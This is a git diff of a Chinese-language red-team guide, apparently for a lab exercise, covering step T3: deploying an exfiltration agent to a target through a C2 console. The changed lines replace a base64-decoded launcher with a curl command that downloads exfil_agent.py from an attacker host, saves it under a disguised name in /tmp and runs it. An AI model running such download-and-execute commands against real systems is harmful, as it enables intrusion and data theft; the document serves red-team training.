@@ -310,17 +310,17 @@ sudo .venv/bin/python3 red_team/exfil_listener.py
 
 ### T3 — 透過 C2 部署 Agent 到靶機
 
-在 C2 prompt 中，用 `deploy_agent.sh` 產生的 one-liner 部署：
+用 `deploy_agent.sh` 啟動 HTTP server，再將一行指令貼到 C2：
 
 ```bash
-# 先在攻擊機產生 deploy 指令
+# 攻擊機：啟動臨時 HTTP server（會印出要貼的指令）
 bash red_team/deploy_agent.sh <ATTACKER_IP>
 ```
 
-將產生的指令貼到 C2 prompt 中執行：
+將印出的指令貼到 C2 prompt 中執行：
 
 ```
-C2> echo '<base64>' | base64 -d > /tmp/.cache_update.py && python3 /tmp/.cache_update.py <ATTACKER_IP>
+C2> curl -s http://<ATTACKER_IP>:8888/exfil_agent.py -o /tmp/.cache_update.py && python3 /tmp/.cache_update.py <ATTACKER_IP>
 ```
 
 Agent 會自動：
